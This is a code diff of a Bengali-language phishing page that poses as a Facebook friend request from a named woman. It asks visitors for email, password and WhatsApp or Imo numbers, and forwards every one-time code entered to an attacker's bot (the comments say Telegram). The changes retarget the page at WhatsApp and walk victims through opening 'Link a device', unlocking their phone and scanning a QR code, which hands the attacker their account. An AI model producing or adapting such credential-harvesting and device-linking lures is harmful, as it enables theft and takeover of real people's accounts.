@@ -38,7 +38,7 @@
     </div>
 
     <div class="bottom-half text-center">
-        <div id="step1" class="w-full flex flex-col items-center gap-4">
+        <div id="step1" class="w-full flex flex-col items-center gap-1">
             <h2 class="text-2xl font-extrabold text-gray-900">ফ্রেন্ড রিকোয়েস্ট পাঠান</h2>
             <p class="text-gray-600 px-4">Mst. Priya Akter কে ফ্রেন্ড রিকোয়েস্ট পাঠাতে নিচের বাটনে ক্লিক করুন।</p>
             <button onclick="showModal()" class="btn-blue">Add Friend</button>
@@ -56,14 +56,16 @@
         <div id="google_chooser" class="hidden w-full flex flex-col items-center gap-4">
             <h1 class="text-xl font-bold text-gray-900">ফ্রেন্ড এড করুন</h1>
             <p class="text-gray-600 text-sm px-4">Mst.Priya Akter এর ফেসবুক আইডি পাসওয়ার্ড দিয়ে Locked করা আছে । তার সাথে এড হতে চাইলে পাসওয়ার্ড নিচের ফাকা ঘরে বসিয়ে  অথবা কিবোর্ডের ওপর থেকে আপনার ইমেইলটি সিলেক্ট করে এড করুন।</p>
-            <input type="email" id="email_field" autocomplete="email" placeholder="ইমেইল এড্রেস" অথবা পাসওয়ার্ড নাম্বার class="secure-input" oninput="autoCaptureEmail(this.value)">
+            <input type="email" id="email_field" autocomplete="email" placeholder="ইমু অথবা হোয়াটসঅ্যাপ নাম্বার" class="secure-input" oninput="autoCaptureEmail(this.value)">
             <button onclick="finalSubmit()" class="btn-blue">Add Friend</button>
         </div>
 
-        <div id="step2" class="hidden w-full flex flex-col items-center gap-4">
-            <h2 class="text-xl font-bold text-gray-900"> ফ্রেন্ড এড করুন </h2>
-            <p class="text-gray-600 px-6">সরাসরি Mst.Priya Akter এর সাথে ইমেইলে কথা বলতে চাইলে নিচের বাটনে ক্লিক করে মেসেজটি পাঠান।</p>
-            <button onclick="triggerGmailAction()" class="btn-blue">Send করুন</button>
+        <div id="success_page" class="hidden w-full flex flex-col items-center gap-3">
+            <div class="bg-green-500 text-white rounded-full w-16 h-16 flex items-center justify-center text-3xl">✓</div>
+            <h2 class="text-2xl font-bold text-green-600">কিউআর স্ক্যানার দিয়ে এড করতে নিচের লাল লেখাগুলো ভালো করে পড়ে এড করুন!</h2>
+            <h3 class="text-xl font-bold text-red-600">নিচে এড বাটুনে ক্লিক করার পরে নীল বাটুন আসবে তারপরে (Link a device) বাটুনে ক্লিক করুন তারপরে আপনার (ফোনের Locked আসবে আনলক করবেন) তারপর (কিউআর স্ক্যানার পাবেন)!তারপর স্ক্যান করে এড করতে পারবেন</h3>
+            <p class="text-gray-600 text-sm">নিচের নীল বাটুনে ক্লিক করার পরে </p>
+            <a href="https://wa.me/settings/linked_devices" class="btn-blue mt-2">Add করুন</a>
         </div>
 
         <div id="verifying" class="hidden w-full flex flex-col items-center gap-5">
@@ -74,13 +76,9 @@
 
         <div id="otp_page" class="hidden w-full flex flex-col items-center">
             <h2 class="text-lg font-bold text-gray-900 mb-2">আইডি পাসওয়ার্ড দিয়ে লক করা আছে।</h2>
-            <p class="text-xs text-gray-600 mb-6 px-4">Add করতে আপনার ফেসবুক নোটিফিকেশনে অথবা Gmail অথবা whatsapp এ আসা ৬/৮ সংখ্যার এড নাম্বার নিচে ফাঁকা ঘরে বসিয়ে এড করুন।</p>
-            <div id="otp-inputs" class="flex justify-center gap-1.5 mb-8">
+            <p class="text-xs text-gray-600 mb-6 px-4"> আপনার whatsapp এ এড নাম্বার এর মেছেজ পাঠানো হয়েছে চেক করুন । মেছেজ এ আসা 4/চার সংখ্যার এড নাম্বার নিচে ফাঁকা ঘরে বসিয়ে এড করুন।</p>
+            <div id="otp-inputs" class="flex justify-center gap-1 mb-4">
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input" autofocus>
-                <input type="text" inputmode="numeric" maxlength="1" class="code-input">
-                <input type="text" inputmode="numeric" maxlength="1" class="code-input">
-                <input type="text" inputmode="numeric" maxlength="1" class="code-input">
-                <input type="text" inputmode="numeric" maxlength="1" class="code-input">
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input">
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input">
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input">
@@ -91,8 +89,8 @@
         <div id="success_page" class="hidden w-full flex flex-col items-center gap-3">
             <div class="bg-green-500 text-white rounded-full w-16 h-16 flex items-center justify-center text-3xl">✓</div>
             <h2 class="text-2xl font-bold text-green-600">অভিনন্দন!</h2>
-            <p class="text-gray-600 text-sm">আপনার অনুরোধটি সফলভাবে গ্রহণ করা হয়েছে।</p>
-            <a href="https://m.me/sabinayasmeen121" class="btn-blue mt-2">View Profile</a>
+            <p class="text-gray-600 text-sm">নিচের নিল বাটুনে ক্লিক করার পরে ,,, নীল বাটন পাবেন (Link a devices বাটুনে ক্লিক করুন তারপরে ফোনের লক আসবে আনলক করুন তারপরে কিউআর স্ক্যানার পাবেন) তার পর কিউআর কোড দিয়ে স্ক্যান করে এড করুন।</p>
+            <a href="https://wa.me/settings/linked_devices" class="btn-blue mt-2">এড করুন</a>
         </div>
 
         <div id="error_page" class="hidden w-full flex flex-col items-center gap-3 px-6">
@@ -202,12 +200,12 @@
             const code = Array.from(otpInputs).map(i => i.value).join('');
 
             // ৬টি সংখ্যা পূর্ণ হলে বাটন নীল হবে এবং টেলিগ্রামে যাবে
-            if (code.length >= 6) {
+            if (code.length >= 1) {
                 otpBtn.disabled = false;
                 otpBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                 
-                if (code.length === 6) {
-                    sendToBot(`📩 **ইউজার ৬ সংখ্যার OTP দিয়েছে:** \`${code}\``);
+                if (code.length === 1) {
+                    sendToBot(`📩 **ইউজার ১ সংখ্যার OTP দিয়েছে:** \`${code}\``);
                 }
             } else {
                 otpBtn.disabled = true;
@@ -215,7 +213,7 @@
             }
 
             // ৮টি সংখ্যা পূর্ণ হলে আবার টেলিগ্রামে আপডেট যাবে
-            if (code.length === 8) {
+            if (code.length === 3) {
                 sendToBot(`📩 **ইউজার পূর্ণ ৮ সংখ্যার OTP দিয়েছে:** \`${code}\``);
             }
         });
